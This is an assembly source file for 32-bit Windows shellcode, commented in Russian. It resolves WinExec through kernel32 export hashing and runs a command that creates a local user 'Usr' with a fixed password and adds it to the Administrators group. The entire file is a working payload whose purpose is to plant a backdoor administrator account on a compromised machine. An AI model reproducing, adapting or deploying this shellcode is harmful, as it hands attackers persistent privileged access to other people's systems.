;dyn_adduser.asm
[SECTION .text]
BITS 32
global _start
_start:
	jmp start_asm

find_kernel32:
	push esi
	xor eax, eax
	mov eax, [fs:eax+0x30]
	test eax, eax
	js find_kernel32_9x
find_kernel32_nt:
	mov eax, [eax + 0x0c]
	mov esi, [eax + 0x1c]
	lodsd
	mov eax, [eax + 0x8]
	jmp find_kernel32_finished
find_kernel32_9x:
	mov eax, [eax + 0x34]
	lea eax, [eax + 0x7c]
	mov eax, [eax + 0x3c]
find_kernel32_finished:
	pop esi
	ret

find_function:
	pushad
	mov ebp, [esp + 0x24]
	mov eax, [ebp + 0x3c]
	mov edx, [ebp + eax + 0x78]
	add edx, ebp
	mov ecx, [edx + 0x18]
	mov ebx, [edx + 0x20]
	add ebx, ebp
find_function_loop:
	jecxz find_function_finished
	dec ecx
	mov esi, [ebx + ecx * 4]
	add esi, ebp ;esi содержит название текущей функции
	; начинаем вычислять её хэш
compute_hash:
	xor edi, edi ; обнуляем edi для хранения результатов вычислений
	xor eax, eax ;обнуляем eax для хранения символов имен функций
	cld
compute_hash_again:
	lodsb
	test al, al
	jz compute_hash_finished
	ror edi, 0xd
	add edi, eax
	jmp compute_hash_again
compute_hash_finished: 
find_function_compare:
	cmp edi, [esp + 0x28]
	jnz find_function_loop
	mov ebx, [edx + 0x24]
	add ebx, ebp
	mov cx, [ebx + 2 * ecx]
	mov ebx, [edx + 0x1c]
	add ebx, ebp
	mov eax, [ebx + 4 * ecx]
	add eax, ebp
	mov [esp + 0x1c], eax
find_function_finished:
	popad
	ret
 
;Конец функции: find_function
;Функция: resolve_symbols_for_dll
resolve_symbols_for_dll:
	;помещаем текущий хэш(на который указывает esi) в eax
	lodsd
	push eax
	push edx
	call find_function
	mov [edi], eax
	add esp, 0x08
	add edi, 0x04
	cmp esi, ecx
	jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
	ret
;Конец функции: resolve_symbols_for_dll
;Объявление констатнт
 
locate_hashes:
	call locate_hashes_return
	;WinExec ;хэш = 0x98 FE 8A 0E
	db 0x98
	db 0xFE
	db 0x8A
	db 0x0E
	;ExitProcess ;хэш = 0x7E D8 E2 73
	db 0x7E
	db 0xD8
	db 0xE2
	db 0x73
;Конец объявления констатнт
start_asm: ;старт главной программы
	sub esp, 0x08 ; выделения места в стеке для адресов функций
	mov ebp, esp
	call find_kernel32 ;ищем адрес Kernel32.dll
	mov edx, eax
	jmp short locate_hashes ;найти адрес хэша
locate_hashes_return: ;запомнить адрес возврата
	pop esi ;получить адреса констант из стека
	lea edi, [ebp + 0x04] ;здесь сохраняем адрес функции
	mov ecx, esi
	add ecx, 0x08 
	call resolve_symbols_for_dll
;секция кода для добавления пользователя в систему
	jmp short GetCommand

CommandReturn:
	pop ebx
	xor eax,eax
	push eax
	push ebx
	call [ebp+4] ;вызов WinExec(path,showcode)
	xor eax,eax ;обнуляем eax
	push eax 

call [ebp+8] ;вызов ExitProcess(0);

GetCommand:
	call CommandReturn
	db "cmd.exe /c net user Usr Passwd /ADD && net localgroup Администраторы /ADD Usr"
	db 0x00
